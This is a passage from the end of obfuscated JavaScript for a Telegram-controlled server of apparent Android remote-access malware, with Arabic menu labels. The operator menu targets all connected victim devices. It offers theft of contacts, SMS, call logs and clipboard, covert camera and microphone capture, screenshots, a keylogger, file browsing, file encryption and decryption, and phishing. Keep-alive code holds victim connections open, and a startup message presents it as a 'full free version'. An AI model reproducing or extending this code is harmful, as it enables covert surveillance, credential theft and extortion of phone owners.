      if (_0xdbde0c.text == "✯ الكل ✯") {
        appData.set("currentTarget", "all");
        bot.sendMessage(data.id, "<b>✯ اختر الإجراء المراد تنفيذه على جميع الأجهزة المتاحة</b>\n\n", {
          'parse_mode': "HTML",
          'reply_markup': {
            'keyboard': [
              ["✯ جهات الاتصال ✯", "✯ الرسائل القصيرة ✯"],
              ["✯ المكالمات ✯", "✯ التطبيقات ✯"],
              ["✯ الكاميرا الرئيسية ✯", "✯ الكاميرا الأمامية ✯"],
              ["✯ الميكروفون ✯", "✯ الحافظة ✯"],
              ["✯ لقطة شاشة ✯", "✯ إشعار منبثق ✯"],
              ["✯ إرسال رسالة ✯", "✯ اهتزاز ✯"],
              ["✯ تشغيل صوت ✯", "✯ إيقاف الصوت ✯"],
              ["✯ تشغيل مسجل المفاتيح ✯", "✯ إيقاف مسجل المفاتيح ✯"],
              ["✯ مستكشف الملفات ✯", "✯ المعرض ✯"],
              ["✯ تشفير ✯", "✯ فك التشفير ✯"],
              ["✯ فتح رابط ✯", "✯ تصيد احتيالي ✯"],
              ["✯ إرسال رسالة لجميع جهات الاتصال ✯"],
              ["✯ إشعار منبثق ✯"],
              ["✯ العودة للقائمة الرئيسية ✯"]
            ],
            'resize_keyboard': true,
            'one_time_keyboard': true
          }
        });
      }
    }
  }
});

// إبقاء الاتصال نشط
setInterval(() => {
  io.sockets.sockets.forEach((_0x107f46, _0x316932, _0x1f46f7) => {
    io.to(_0x316932).emit("ping", {});
  });
}, 5000);

// إبقاء الاستضافة نشطة
setInterval(() => {
  https.get(data.host, _0x9df260 => {}).on("error", _0x26bc04 => {});
}, 480000);

server.listen(process.env.PORT || 3000, () => {
  console.log("يعمل على المنفذ 3000 - نسخة مجانية كاملة");
});
